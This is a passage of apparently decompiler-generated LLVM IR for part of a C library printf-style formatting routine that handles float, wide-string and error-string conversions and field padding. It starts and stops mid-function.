  store i32 %v2_805ffb7, i32* @ebp, align 4
  br label %dec_label_pc_80601b9

dec_label_pc_805ffcb:                             ; preds = %dec_label_pc_805fe65
  %v1_805ffcb = add i32 %v3_805fe37, -15
  %v5_805ffcb = icmp ult i32 %v3_805fe37, 15
  %v9_805ffcb = icmp eq i32 %v1_805ffcb, 0
  %v10_805ffcb = icmp slt i32 %v1_805ffcb, 0
  store i1 %v10_805ffcb, i1* %sf.global-to-local, align 1
  %v2_805ffce = or i1 %v5_805ffcb, %v9_805ffcb
  br i1 %v2_805ffce, label %dec_label_pc_805ffd0, label %dec_label_pc_806000a

dec_label_pc_805ffd0:                             ; preds = %dec_label_pc_805ffcb
  %v1_805ffd0 = add i32 %v0_805fec7.lcssa, 33
  %v2_805ffd0 = inttoptr i32 %v1_805ffd0 to i8*
  %v3_805ffd0 = load i8, i8* %v2_805ffd0, align 1
  %v4_805ffd0 = and i8 %v3_805ffd0, 8
  %v5_805ffd0 = icmp eq i8 %v4_805ffd0, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_805ffd5 = add i32 %v0_805fec7.lcssa, 332
  %v2_805ffd5 = inttoptr i32 %v1_805ffd5 to i32*
  %v3_805ffd5 = load i32, i32* %v2_805ffd5, align 4
  store i32 %v3_805ffd5, i32* %eax.global-to-local, align 4
  br i1 %v5_805ffd0, label %dec_label_pc_805ffe2, label %dec_label_pc_805ffde

dec_label_pc_805ffde:                             ; preds = %dec_label_pc_805ffd0
  %v1_805ffde = inttoptr i32 %v3_805ffd5 to x86_fp80*
  %v2_805ffde = load x86_fp80, x86_fp80* %v1_805ffde, align 4
  br label %dec_label_pc_805ffe4

dec_label_pc_805ffe2:                             ; preds = %dec_label_pc_805ffd0
  %v1_805ffe2 = inttoptr i32 %v3_805ffd5 to double*
  %v2_805ffe2 = load double, double* %v1_805ffe2, align 4
  %v3_805ffe2 = fpext double %v2_805ffe2 to x86_fp80
  br label %dec_label_pc_805ffe4

dec_label_pc_805ffe4:                             ; preds = %dec_label_pc_805ffde, %dec_label_pc_805ffe2
  %storemerge5 = phi x86_fp80 [ %v2_805ffde, %dec_label_pc_805ffde ], [ %v3_805ffe2, %dec_label_pc_805ffe2 ]
  store x86_fp80 %storemerge5, x86_fp80* %st0.global-to-local, align 4
  %v0_805ffe4 = load i32, i32* @ebx, align 4
  %v2_805ffe4 = add i32 %v0_805fec7.lcssa, -4
  %v3_805ffe4 = inttoptr i32 %v2_805ffe4 to i32*
  store i32 %v0_805ffe4, i32* %v3_805ffe4, align 4
  %v0_805ffe5 = load i32, i32* @ebx, align 4
  %v2_805ffe5 = add i32 %v0_805fec7.lcssa, -8
  %v3_805ffe5 = inttoptr i32 %v2_805ffe5 to i32*
  store i32 %v0_805ffe5, i32* %v3_805ffe5, align 4
  %v1_805ffe6 = add i32 %v0_805fec7.lcssa, -12
  %v2_805ffe6 = inttoptr i32 %v1_805ffe6 to i32*
  store i32 134610092, i32* %v2_805ffe6, align 4
  %v1_805ffeb = add i32 %v0_805fec7.lcssa, 20
  store i32 %v1_805ffeb, i32* %eax.global-to-local, align 4
  %v2_805ffef = add i32 %v0_805fec7.lcssa, -16
  %v3_805ffef = inttoptr i32 %v2_805ffef to i32*
  store i32 %v1_805ffeb, i32* %v3_805ffef, align 4
  %v1_805fff0 = add i32 %v0_805fec7.lcssa, -28
  %v10_805fff0 = icmp slt i32 %v1_805fff0, 0
  store i1 %v10_805fff0, i1* %sf.global-to-local, align 1
  %v1_805fff3 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_805fff3 = inttoptr i32 %v1_805fff0 to x86_fp80*
  store x86_fp80 %v1_805fff3, x86_fp80* %v3_805fff3, align 4
  %v1_805fff6 = add i32 %v0_805fec7.lcssa, 384
  %v2_805fff6 = inttoptr i32 %v1_805fff6 to i32*
  %v3_805fff6 = load i32, i32* %v2_805fff6, align 4
  %v5_805fff6 = add i32 %v0_805fec7.lcssa, -32
  %v6_805fff6 = inttoptr i32 %v5_805fff6 to i32*
  store i32 %v3_805fff6, i32* %v6_805fff6, align 4
  %v0_805fffd = call i32 @_fpmaxtostr()
  store i32 %v0_805fffd, i32* %eax.global-to-local, align 4
  %v0_8060002 = load i32, i32* @esp, align 4
  %v1_8060002 = add i32 %v0_8060002, 32
  br label %dec_label_pc_8060190

dec_label_pc_806000a:                             ; preds = %dec_label_pc_805ffcb
  %v1_806000a = add i32 %v3_805fe37, -17
  %v5_806000a = icmp ult i32 %v3_805fe37, 17
  %v9_806000a = icmp eq i32 %v1_806000a, 0
  %v10_806000a = icmp slt i32 %v1_806000a, 0
  store i1 %v10_806000a, i1* %sf.global-to-local, align 1
  %v2_806000d = or i1 %v5_806000a, %v9_806000a
  br i1 %v2_806000d, label %dec_label_pc_8060013, label %dec_label_pc_80600a3

dec_label_pc_8060013:                             ; preds = %dec_label_pc_806000a
  %v3_8060013 = load i32, i32* %v2_805fe37, align 4
  %v4_8060013 = add i32 %v3_8060013, -17
  %v12_8060013 = icmp eq i32 %v4_8060013, 0
  %v13_8060013 = icmp slt i32 %v4_8060013, 0
  store i1 %v13_8060013, i1* %sf.global-to-local, align 1
  %v1_8060018 = add i32 %v0_805fec7.lcssa, 352
  %v2_8060018 = inttoptr i32 %v1_8060018 to i32*
  store i32 0, i32* %v2_8060018, align 4
  %v0_8060023 = load i32, i32* @esp, align 4
  %v1_8060023 = add i32 %v0_8060023, 332
  %v2_8060023 = inttoptr i32 %v1_8060023 to i32*
  %v3_8060023 = load i32, i32* %v2_8060023, align 4
  store i32 %v3_8060023, i32* %eax.global-to-local, align 4
  %v1_806002a = icmp eq i1 %v12_8060013, false
  br i1 %v1_806002a, label %dec_label_pc_8060073, label %dec_label_pc_806002c

dec_label_pc_806002c:                             ; preds = %dec_label_pc_8060013
  %v1_806002c = inttoptr i32 %v3_8060023 to i32*
  %v2_806002c = load i32, i32* %v1_806002c, align 4
  store i32 %v2_806002c, i32* %eax.global-to-local, align 4
  %v1_806002e = icmp eq i32 %v2_806002c, 0
  %v2_806002e = icmp slt i32 %v2_806002c, 0
  store i1 %v2_806002e, i1* %sf.global-to-local, align 1
  %v2_8060030 = add i32 %v0_8060023, 360
  %v3_8060030 = inttoptr i32 %v2_8060030 to i32*
  store i32 %v2_806002c, i32* %v3_8060030, align 4
  %v0_80600de.pre = load i32, i32* @esp, align 4
  br i1 %v1_806002e, label %dec_label_pc_80600de, label %dec_label_pc_806003d

dec_label_pc_806003d:                             ; preds = %dec_label_pc_806002c
  %v1_806003d = add i32 %v0_80600de.pre, 20
  %v2_806003d = inttoptr i32 %v1_806003d to i32*
  %v3_806003d = load i32, i32* %v2_806003d, align 4
  %v1_8060041 = add i32 %v0_80600de.pre, 352
  %v2_806004b = icmp slt i32 %v3_806003d, 0
  store i1 %v2_806004b, i1* %sf.global-to-local, align 1
  %v1_806004d = icmp eq i1 %v2_806004b, false
  %v4_806004d = select i1 %v1_806004d, i32 %v3_806003d, i32 -1
  store i32 %v4_806004d, i32* %edx.global-to-local, align 4
  %v1_8060050 = add i32 %v0_80600de.pre, 360
  store i32 %v1_8060050, i32* %eax.global-to-local, align 4
  %v2_8060057 = add i32 %v0_80600de.pre, -4
  %v3_8060057 = inttoptr i32 %v2_8060057 to i32*
  store i32 %v1_8060041, i32* %v3_8060057, align 4
  %v0_8060058 = load i32, i32* %edx.global-to-local, align 4
  %v2_8060058 = add i32 %v0_80600de.pre, -8
  %v3_8060058 = inttoptr i32 %v2_8060058 to i32*
  store i32 %v0_8060058, i32* %v3_8060058, align 4
  %v0_8060059 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060059 = add i32 %v0_80600de.pre, -12
  %v3_8060059 = inttoptr i32 %v2_8060059 to i32*
  store i32 %v0_8060059, i32* %v3_8060059, align 4
  %v0_806005a = load i32, i32* %eax.global-to-local, align 4
  %v2_806005a = add i32 %v0_80600de.pre, -16
  %v3_806005a = inttoptr i32 %v2_806005a to i32*
  store i32 %v0_806005a, i32* %v3_806005a, align 4
  %v0_806005b = call i32 @__GI_wcsrtombs()
  store i32 %v0_806005b, i32* %eax.global-to-local, align 4
  %v0_8060060 = load i32, i32* @esp, align 4
  %v1_8060060 = add i32 %v0_8060060, 16
  %v1_8060063 = add i32 %v0_806005b, 1
  %v10_8060063 = icmp eq i32 %v1_8060063, 0
  %v11_8060063 = icmp slt i32 %v1_8060063, 0
  store i1 %v11_8060063, i1* %sf.global-to-local, align 1
  store i32 %v0_806005b, i32* @esi, align 4
  %v1_8060068 = icmp eq i1 %v10_8060063, false
  br i1 %v1_8060068, label %dec_label_pc_80601ab, label %dec_label_pc_8060322

dec_label_pc_8060073:                             ; preds = %dec_label_pc_8060013
  %v2_8060073 = add i32 %v0_8060023, -4
  %v3_8060073 = inttoptr i32 %v2_8060073 to i32*
  store i32 %v3_805fe37, i32* %v3_8060073, align 4
  %v1_8060074 = add i32 %v0_8060023, 352
  store i32 %v1_8060074, i32* %edx.global-to-local, align 4
  %v2_806007b = add i32 %v0_8060023, -8
  %v3_806007b = inttoptr i32 %v2_806007b to i32*
  store i32 %v1_8060074, i32* %v3_806007b, align 4
  %v0_806007c = load i32, i32* %eax.global-to-local, align 4
  %v1_806007c = inttoptr i32 %v0_806007c to i32*
  %v2_806007c = load i32, i32* %v1_806007c, align 4
  %v4_806007c = add i32 %v0_8060023, -12
  %v5_806007c = inttoptr i32 %v4_806007c to i32*
  store i32 %v2_806007c, i32* %v5_806007c, align 4
  %v1_806007e = add i32 %v0_8060023, 204
  store i32 %v1_806007e, i32* @ebx, align 4
  %v2_8060085 = add i32 %v0_8060023, -16
  %v3_8060085 = inttoptr i32 %v2_8060085 to i32*
  store i32 %v1_806007e, i32* %v3_8060085, align 4
  %v0_8060086 = call i32 @__GI_wcrtomb()
  store i32 %v0_8060086, i32* %eax.global-to-local, align 4
  %v0_806008b = load i32, i32* @esp, align 4
  %v1_806008b = add i32 %v0_806008b, 16
  %v1_806008e = add i32 %v0_8060086, 1
  %v10_806008e = icmp eq i32 %v1_806008e, 0
  %v11_806008e = icmp slt i32 %v1_806008e, 0
  store i1 %v11_806008e, i1* %sf.global-to-local, align 1
  store i32 %v0_8060086, i32* @esi, align 4
  br i1 %v10_806008e, label %dec_label_pc_8060322, label %dec_label_pc_8060099

dec_label_pc_8060099:                             ; preds = %dec_label_pc_8060073
  %v2_8060099 = add i32 %v0_8060086, 220
  %v3_8060099 = add i32 %v2_8060099, %v0_806008b
  %v4_8060099 = inttoptr i32 %v3_8060099 to i8*
  store i8 0, i8* %v4_8060099, align 1
  br label %dec_label_pc_80600d5

dec_label_pc_80600a3:                             ; preds = %dec_label_pc_806000a
  %v1_80600a3 = add i32 %v3_805fe37, -19
  %v5_80600a3 = icmp ult i32 %v3_805fe37, 19
  %v9_80600a3 = icmp eq i32 %v1_80600a3, 0
  %v10_80600a3 = icmp slt i32 %v1_80600a3, 0
  store i1 %v10_80600a3, i1* %sf.global-to-local, align 1
  %v2_80600a6 = or i1 %v5_80600a3, %v9_80600a3
  br i1 %v2_80600a6, label %dec_label_pc_80600ac, label %dec_label_pc_8060131

dec_label_pc_80600ac:                             ; preds = %dec_label_pc_80600a3
  %v1_80600ac = add i32 %v0_805fec7.lcssa, 332
  %v2_80600ac = inttoptr i32 %v1_80600ac to i32*
  %v3_80600ac = load i32, i32* %v2_80600ac, align 4
  store i32 %v3_80600ac, i32* %eax.global-to-local, align 4
  %v1_80600b3 = icmp eq i1 %v9_80600a3, false
  %v1_8060103 = inttoptr i32 %v3_80600ac to i32*
  %v2_8060103 = load i32, i32* %v1_8060103, align 4
  br i1 %v1_80600b3, label %dec_label_pc_8060103, label %dec_label_pc_80600b5

dec_label_pc_80600b5:                             ; preds = %dec_label_pc_80600ac
  store i32 %v2_8060103, i32* @ebx, align 4
  %v1_80600b7 = icmp eq i32 %v2_8060103, 0
  %v2_80600b7 = icmp slt i32 %v2_8060103, 0
  store i1 %v2_80600b7, i1* %sf.global-to-local, align 1
  br i1 %v1_80600b7, label %dec_label_pc_80600de, label %dec_label_pc_80600bb

dec_label_pc_80600bb:                             ; preds = %dec_label_pc_80600b5, %dec_label_pc_8060136
  %v1_80600c7 = phi i32 [ %v0_805fec7.lcssa, %dec_label_pc_80600b5 ], [ %v1_8060151, %dec_label_pc_8060136 ]
  %v1_80600bb = add i32 %v1_80600c7, 20
  %v2_80600bb = inttoptr i32 %v1_80600bb to i32*
  %v3_80600bb = load i32, i32* %v2_80600bb, align 4
  store i32 %v3_80600bb, i32* %edx.global-to-local, align 4
  %v2_80600c2 = icmp slt i32 %v3_80600bb, 0
  store i1 %v2_80600c2, i1* %sf.global-to-local, align 1
  %v1_80600c4 = icmp eq i1 %v2_80600c2, false
  %v4_80600c4 = select i1 %v1_80600c4, i32 %v3_80600bb, i32 -1
  store i32 %v4_80600c4, i32* %eax.global-to-local, align 4
  %v2_80600c7 = add i32 %v1_80600c7, -4
  %v3_80600c7 = inttoptr i32 %v2_80600c7 to i32*
  store i32 %v3_80600bb, i32* %v3_80600c7, align 4
  %v2_80600c8 = add i32 %v1_80600c7, -8
  %v3_80600c8 = inttoptr i32 %v2_80600c8 to i32*
  store i32 %v3_80600bb, i32* %v3_80600c8, align 4
  %v0_80600c9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80600c9 = add i32 %v1_80600c7, -12
  %v3_80600c9 = inttoptr i32 %v2_80600c9 to i32*
  store i32 %v0_80600c9, i32* %v3_80600c9, align 4
  %v0_80600ca = load i32, i32* @ebx, align 4
  %v2_80600ca = add i32 %v1_80600c7, -16
  %v3_80600ca = inttoptr i32 %v2_80600ca to i32*
  store i32 %v0_80600ca, i32* %v3_80600ca, align 4
  %v0_80600cb = call i32 @strnlen()
  store i32 %v0_80600cb, i32* %eax.global-to-local, align 4
  %v0_80600d0 = load i32, i32* @esp, align 4
  %v1_80600d0 = add i32 %v0_80600d0, 16
  %v7_80600d0 = icmp slt i32 %v1_80600d0, 0
  store i1 %v7_80600d0, i1* %sf.global-to-local, align 1
  store i32 %v0_80600cb, i32* @esi, align 4
  br label %dec_label_pc_80600d5

dec_label_pc_80600d5:                             ; preds = %dec_label_pc_8060099, %dec_label_pc_80600bb
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  store i32 11, i32* @edi, align 4
  br label %dec_label_pc_8060127

dec_label_pc_80600de:                             ; preds = %dec_label_pc_806002c, %dec_label_pc_80600b5
  %v0_80600de = phi i32 [ %v0_805fec7.lcssa, %dec_label_pc_80600b5 ], [ %v0_80600de.pre, %dec_label_pc_806002c ]
  %v1_80600de = add i32 %v0_80600de, 20
  %v2_80600de = inttoptr i32 %v1_80600de to i32*
  %v3_80600de = load i32, i32* %v2_80600de, align 4
  store i32 %v3_80600de, i32* %eax.global-to-local, align 4
  store i32 6, i32* @esi, align 4
  %v2_80600e7 = icmp slt i32 %v3_80600de, 0
  store i1 %v2_80600e7, i1* %sf.global-to-local, align 1
  br i1 %v2_80600e7, label %dec_label_pc_80600f5, label %dec_label_pc_80600eb

dec_label_pc_80600eb:                             ; preds = %dec_label_pc_80600de
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_80600f5

dec_label_pc_80600f5:                             ; preds = %dec_label_pc_80600de, %dec_label_pc_80600eb
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  store i32 11, i32* @edi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_806eed2.1571 to i32), i32* @ebx, align 4
  br label %dec_label_pc_8060127

dec_label_pc_8060103:                             ; preds = %dec_label_pc_80600ac
  store i32 %v2_8060103, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  store i32 11, i32* @edi, align 4
  %v1_8060111 = add i32 %v0_805fec7.lcssa, 204
  store i32 %v1_8060111, i32* @ebx, align 4
  %v1_8060118 = add i32 %v0_805fec7.lcssa, 205
  %v2_8060118 = inttoptr i32 %v1_8060118 to i8*
  store i8 0, i8* %v2_8060118, align 1
  %v0_8060120 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060120 = trunc i32 %v0_8060120 to i8
  %v2_8060120 = load i32, i32* @esp, align 4
  %v3_8060120 = add i32 %v2_8060120, 204
  %v4_8060120 = inttoptr i32 %v3_8060120 to i8*
  store i8 %v1_8060120, i8* %v4_8060120, align 1
  br label %dec_label_pc_8060127

dec_label_pc_8060127:                             ; preds = %dec_label_pc_80600f5, %dec_label_pc_80600d5, %dec_label_pc_8060103
  %v0_8060127 = load i32, i32* @esp, align 4
  %v1_8060127 = add i32 %v0_8060127, 7
  %v2_8060127 = inttoptr i32 %v1_8060127 to i8*
  store i8 32, i8* %v2_8060127, align 1
  br label %dec_label_pc_80601b9

dec_label_pc_8060131:                             ; preds = %dec_label_pc_80600a3
  %v1_8060131 = add i32 %v3_805fe37, -20
  %v9_8060131 = icmp eq i32 %v1_8060131, 0
  %v10_8060131 = icmp slt i32 %v1_8060131, 0
  store i1 %v10_8060131, i1* %sf.global-to-local, align 1
  %v1_8060134 = icmp eq i1 %v9_8060131, false
  br i1 %v1_8060134, label %dec_label_pc_806015b, label %dec_label_pc_8060136

dec_label_pc_8060136:                             ; preds = %dec_label_pc_8060131
  %v2_8060136 = add i32 %v0_805fec7.lcssa, -4
  %v3_8060136 = inttoptr i32 %v2_8060136 to i32*
  store i32 %v5_805fe6e.lcssa, i32* %v3_8060136, align 4
  %v1_8060137 = add i32 %v0_805fec7.lcssa, -8
  %v2_8060137 = inttoptr i32 %v1_8060137 to i32*
  store i32 128, i32* %v2_8060137, align 4
  %v1_806013c = add i32 %v0_805fec7.lcssa, 204
  %v2_8060143 = add i32 %v0_805fec7.lcssa, -12
  %v3_8060143 = inttoptr i32 %v2_8060143 to i32*
  store i32 %v1_806013c, i32* %v3_8060143, align 4
  store i32 -8, i32* %eax.global-to-local, align 4
  %v2_8060149 = load i32, i32* inttoptr (i32 -8 to i32*), align 8
  %v4_8060149 = add i32 %v0_805fec7.lcssa, -16
  %v5_8060149 = inttoptr i32 %v4_8060149 to i32*
  store i32 %v2_8060149, i32* %v5_8060149, align 4
  %v0_806014c = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_806014c, i32* %eax.global-to-local, align 4
  %v0_8060151 = load i32, i32* @esp, align 4
  %v1_8060151 = add i32 %v0_8060151, 16
  %v7_8060151 = icmp slt i32 %v1_8060151, 0
  store i1 %v7_8060151, i1* %sf.global-to-local, align 1
  store i32 %v0_806014c, i32* @ebx, align 4
  br label %dec_label_pc_80600bb

dec_label_pc_806015b:                             ; preds = %dec_label_pc_8060131
  %v0_806015b = load i32, i32* bitcast (i32** @global_var_80719f4.1573 to i32*), align 4
  store i32 %v0_806015b, i32* %edx.global-to-local, align 4
  store i32 %v0_806015b, i32* %ebx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80719fe.1574 to i32), i32* @ecx, align 4
  %v1_8060166 = inttoptr i32 %v0_806015b to i8*
  %v2_8060166 = load i8, i8* %v1_8060166, align 1
  %v3_8060166 = zext i8 %v2_8060166 to i32
  %v2_806016f = add i32 %v0_805fec7.lcssa, -4
  %v3_806016f = inttoptr i32 %v2_806016f to i32*
  store i32 %v3_8060166, i32* %v3_806016f, align 4
  %v0_8060170 = load i32, i32* %edx.global-to-local, align 4
  %v1_8060170 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8060170 = sub i32 %v0_8060170, %v1_8060170
  %v13_8060170 = icmp slt i32 %v2_8060170, 0
  store i1 %v13_8060170, i1* %sf.global-to-local, align 1
  store i32 %v2_8060170, i32* %edx.global-to-local, align 4
  %v1_8060172 = add i32 %v0_805fec7.lcssa, 332
  %v2_8060179 = add i32 %v0_805fec7.lcssa, -8
  %v3_8060179 = inttoptr i32 %v2_8060179 to i32*
  store i32 %v1_8060172, i32* %v3_8060179, align 4
  %v1_806017a = add i32 %v0_805fec7.lcssa, 20
  store i32 %v1_806017a, i32* %eax.global-to-local, align 4
  %v2_806017e = add i32 %v0_805fec7.lcssa, -12
  %v3_806017e = inttoptr i32 %v2_806017e to i32*
  store i32 %v1_806017a, i32* %v3_806017e, align 4
  %v1_806017f = add i32 %v0_805fec7.lcssa, 384
  %v2_806017f = inttoptr i32 %v1_806017f to i32*
  %v3_806017f = load i32, i32* %v2_806017f, align 4
  %v5_806017f = add i32 %v0_805fec7.lcssa, -16
  %v6_806017f = inttoptr i32 %v5_806017f to i32*
  store i32 %v3_806017f, i32* %v6_806017f, align 4
  %v1_8060186 = add i32 %v0_805fec7.lcssa, -20
  %v2_8060186 = inttoptr i32 %v1_8060186 to i32*
  store i32 ptrtoint (i32* @global_var_806018d.1575 to i32), i32* %v2_8060186, align 4
  %v3_8060186 = load i32, i32* %edx.global-to-local, align 4
  %v4_8060186 = mul i32 %v3_8060186, 4
  %v5_8060186 = add i32 %v4_8060186, ptrtoint (i32* @global_var_80788a0.1576 to i32)
  %v6_8060186 = inttoptr i32 %v5_8060186 to i32*
  %v7_8060186 = load i32, i32* %v6_8060186, align 4
  call void @__pseudo_call(i32 %v7_8060186)
  %v0_806018d = load i32, i32* @esp, align 4
  %v1_806018d = add i32 %v0_806018d, 16
  %v0_8060190.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060190

dec_label_pc_8060190:                             ; preds = %dec_label_pc_805ffe4, %dec_label_pc_806015b
  %v3_8060198 = phi i32 [ %v0_805fffd, %dec_label_pc_805ffe4 ], [ %v0_8060190.pre, %dec_label_pc_806015b ]
  %v20_8060198 = phi i32 [ %v1_8060002, %dec_label_pc_805ffe4 ], [ %v1_806018d, %dec_label_pc_806015b ]
  %v2_8060190 = icmp slt i32 %v3_8060198, 0
  store i1 %v2_8060190, i1* %sf.global-to-local, align 1
  br i1 %v2_8060190, label %dec_label_pc_8060322, label %dec_label_pc_8060198

dec_label_pc_8060198:                             ; preds = %dec_label_pc_8060190
  %v1_8060198 = inttoptr i32 %v20_8060198 to i32*
  %v2_8060198 = load i32, i32* %v1_8060198, align 4
  %v4_8060198 = add i32 %v2_8060198, %v3_8060198
  %v15_8060198 = icmp slt i32 %v4_8060198, 0
  store i1 %v15_8060198, i1* %sf.global-to-local, align 1
  store i32 %v4_8060198, i32* %v1_8060198, align 4
  %v0_806030f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806030f

dec_label_pc_80601ab:                             ; preds = %dec_label_pc_806003d
  store i32 0, i32* @ebp, align 4
  store i32 11, i32* @edi, align 4
  %v1_80601b2 = add i32 %v0_8060060, 23
  %v2_80601b2 = inttoptr i32 %v1_80601b2 to i8*
  store i8 32, i8* %v2_80601b2, align 1
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80601b9

dec_label_pc_80601b9:                             ; preds = %dec_label_pc_8060127, %dec_label_pc_805ffc2, %dec_label_pc_805ffbb, %dec_label_pc_80601ab
  %v0_80601b9 = load i32, i32* @edi, align 4
  %v1_80601b9 = add i32 %v0_80601b9, -11
  %v9_80601b9 = icmp eq i32 %v1_80601b9, 0
  %v10_80601b9 = icmp slt i32 %v1_80601b9, 0
  store i1 %v10_80601b9, i1* %sf.global-to-local, align 1
  %v0_80601bc = load i32, i32* @ebp, align 4
  %v1_80601bc = load i32, i32* @esi, align 4
  %v2_80601bc = add i32 %v1_80601bc, %v0_80601bc
  store i32 %v2_80601bc, i32* @ecx, align 4
  br i1 %v9_80601b9, label %dec_label_pc_80601ce, label %dec_label_pc_80601c2

dec_label_pc_80601c2:                             ; preds = %dec_label_pc_80601b9
  %v1_80601c4 = add i32 %v0_80601b9, -5
  %v6_80601c4 = sub i32 4, %v0_80601b9
  %v7_80601c4 = and i32 %v6_80601c4, %v0_80601b9
  %v8_80601c4 = icmp slt i32 %v7_80601c4, 0
  %v9_80601c4 = icmp eq i32 %v1_80601c4, 0
  %v10_80601c4 = icmp slt i32 %v1_80601c4, 0
  store i1 %v10_80601c4, i1* %sf.global-to-local, align 1
  %v3_80601c7 = icmp eq i1 %v10_80601c4, %v8_80601c4
  %v4_80601c7 = icmp eq i1 %v9_80601c4, false
  %v5_80601c7 = and i1 %v4_80601c7, %v3_80601c7
  %v6_80601c7 = zext i1 %v5_80601c7 to i32
  store i32 %v6_80601c7, i32* %eax.global-to-local, align 4
  %v2_80601ca = add i32 %v2_80601bc, 1
  %v3_80601ca = add i32 %v2_80601ca, %v6_80601c7
  store i32 %v3_80601ca, i32* @ecx, align 4
  br label %dec_label_pc_80601ce

dec_label_pc_80601ce:                             ; preds = %dec_label_pc_80601b9, %dec_label_pc_80601c2
  %v0_80601ce = load i32, i32* @esp, align 4
  %v1_80601ce = add i32 %v0_80601ce, 24
  %v2_80601ce = inttoptr i32 %v1_80601ce to i32*
  %v3_80601ce = load i32, i32* %v2_80601ce, align 4
  store i32 %v3_80601ce, i32* %eax.global-to-local, align 4
  %v1_80601d2 = add i32 %v0_80601ce, 8
  %v2_80601d2 = inttoptr i32 %v1_80601d2 to i32*
  store i32 0, i32* %v2_80601d2, align 4
  %v0_80601da = load i32, i32* %eax.global-to-local, align 4
  %v1_80601dc = load i32, i32* @ecx, align 4
  %v2_80601dc = sub i32 %v0_80601da, %v1_80601dc
  %v7_80601dc = icmp ult i32 %v0_80601da, %v1_80601dc
  %v12_80601dc = icmp eq i32 %v2_80601dc, 0
  store i32 %v2_80601dc, i32* %edx.global-to-local, align 4
  %v2_80601e0 = or i1 %v7_80601dc, %v12_80601dc
  %v4_80601e0 = load i32, i32* @esp, align 4
  %v5_80601e0 = add i32 %v4_80601e0, 8
  %v6_80601e0 = inttoptr i32 %v5_80601e0 to i32*
  %v7_80601e0 = load i32, i32* %v6_80601e0, align 4
  %v8_80601e0 = select i1 %v2_80601e0, i32 %v7_80601e0, i32 %v2_80601dc
  store i32 %v8_80601e0, i32* %edx.global-to-local, align 4
  store i32 %v8_80601e0, i32* %v6_80601e0, align 4
  %v0_80601e9 = load i32, i32* @esp, align 4
  %v1_80601e9 = inttoptr i32 %v0_80601e9 to i32*
  %v2_80601e9 = load i32, i32* %v1_80601e9, align 4
  store i32 %v2_80601e9, i32* @edx, align 4
  %v0_80601ec = load i32, i32* @ecx, align 4
  %v2_80601ec = add i32 %v0_80601ec, %v2_80601e9
  store i32 %v2_80601ec, i32* %eax.global-to-local, align 4
  %v2_80601ef = add i32 %v0_80601e9, 8
  %v3_80601ef = inttoptr i32 %v2_80601ef to i32*
  %v4_80601ef = load i32, i32* %v3_80601ef, align 4
  %v5_80601ef = add i32 %v4_80601ef, %v2_80601ec
  %v16_80601ef = icmp slt i32 %v5_80601ef, 0
  store i1 %v16_80601ef, i1* %sf.global-to-local, align 1
  store i32 %v5_80601ef, i32* %eax.global-to-local, align 4
  %v1_80601f3 = add i32 %v0_80601e9, 7
  %v2_80601f3 = inttoptr i32 %v1_80601f3 to i8*
  %v3_80601f3 = load i8, i8* %v2_80601f3, align 1
  %v4_80601f3 = add i8 %v3_80601f3, -48
  %v9_80601f3 = icmp eq i8 %v4_80601f3, 0
  %v10_80601f3 = icmp slt i8 %v4_80601f3, 0
  store i1 %v10_80601f3, i1* %sf.global-to-local, align 1
  store i32 %v5_80601ef, i32* %v1_80601e9, align 4
  %v1_80601fb = icmp eq i1 %v9_80601f3, false
  br i1 %v1_80601fb, label %dec_label_pc_8060209, label %dec_label_pc_80601fd

dec_label_pc_80601fd:                             ; preds = %dec_label_pc_80601ce
  %v0_80601fd = load i32, i32* @ebp, align 4
  %v1_80601fd = load i32, i32* @esp, align 4
  %v2_80601fd = add i32 %v1_80601fd, 8
  %v3_80601fd = inttoptr i32 %v2_80601fd to i32*
  %v4_80601fd = load i32, i32* %v3_80601fd, align 4
  %v5_80601fd = add i32 %v4_80601fd, %v0_80601fd
  %v16_80601fd = icmp slt i32 %v5_80601fd, 0
  store i1 %v16_80601fd, i1* %sf.global-to-local, align 1
  store i32 %v5_80601fd, i32* @ebp, align 4
  store i32 0, i32* %v3_80601fd, align 4
  br label %dec_label_pc_8060209

dec_label_pc_8060209:                             ; preds = %dec_label_pc_80601ce, %dec_label_pc_80601fd
  %v0_8060209 = load i32, i32* @esp, align 4
  %v1_8060209 = add i32 %v0_8060209, 32
  %v2_8060209 = inttoptr i32 %v1_8060209 to i8*
  %v3_8060209 = load i8, i8* %v2_8060209, align 1
  %v4_8060209 = and i8 %v3_8060209, 8
  %v5_8060209 = icmp eq i8 %v4_8060209, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_806020e = icmp eq i1 %v5_8060209, false
  br i1 %v1_806020e, label %dec_label_pc_8060237, label %dec_label_pc_8060210

dec_label_pc_8060210:                             ; preds = %dec_label_pc_8060209
  %v1_8060210 = add i32 %v0_8060209, 8
  %v2_8060210 = inttoptr i32 %v1_8060210 to i32*
  %v3_8060210 = load i32, i32* %v2_8060210, align 4
  store i32 %v3_8060210, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8060219 = add i32 %v0_8060209, 384
  %v2_8060219 = inttoptr i32 %v1_8060219 to i32*
  %v3_8060219 = load i32, i32* %v2_8060219, align 4
  store i32 %v3_8060219, i32* @eax, align 4
  %v0_8060220 = call i32 @_charpad()
  store i32 %v0_8060220, i32* %eax.global-to-local, align 4
  %v1_8060225 = load i32, i32* @esp, align 4
  %v2_8060225 = add i32 %v1_8060225, 8
  %v3_8060225 = inttoptr i32 %v2_8060225 to i32*
  %v4_8060225 = load i32, i32* %v3_8060225, align 4
  %v5_8060225 = sub i32 %v0_8060220, %v4_8060225
  %v15_8060225 = icmp eq i32 %v5_8060225, 0
